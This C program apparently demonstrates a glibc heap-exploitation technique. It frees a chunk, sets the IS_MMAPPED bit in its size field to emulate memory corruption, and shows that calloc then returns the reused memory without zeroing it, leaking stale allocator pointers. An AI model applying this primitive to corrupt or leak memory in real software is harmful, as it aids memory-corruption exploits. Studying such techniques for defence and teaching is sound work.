#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define PREV_INUSE 0x1
#define IS_MMAPPED 0x2

typedef size_t INTERNAL_SIZE_T;

struct malloc_chunk {
    INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */
    INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */

    struct malloc_chunk* fd;         /* double links -- used only if free. */
    struct malloc_chunk* bk;

    /* Only used for large blocks: pointer to next larger size.  */
    struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
    struct malloc_chunk* bk_nextsize;
};

typedef struct malloc_chunk* mchunkptr;

int main(int argc, const char* argv[]) {
	void *mem = malloc(0x100);
    mchunkptr chunk = (mchunkptr)((char*)mem - offsetof(struct malloc_chunk, fd));
    printf("allocated victim chunk with requested size 0x100, " \
           "victim->size == 0x%zx\n", chunk->size);

	malloc(0x100);
    printf("allocated another chunk to prevent victim from being " \
            "coalesced into top\n");

    printf("freeing victim chunk\n");
    free(mem);

    printf("emulating corruption of the IS_MMAPPED bit of victim->size\n");
    chunk->size = chunk->size | IS_MMAPPED;

    printf("making a calloc request for an exact size match\n");
    size_t *calloced = calloc(0x100, 1);

    printf("the first 2 qwords of the returned region:\n0x%zx 0x%zx\n",
            calloced[0], calloced[1]);
	return 0;
}
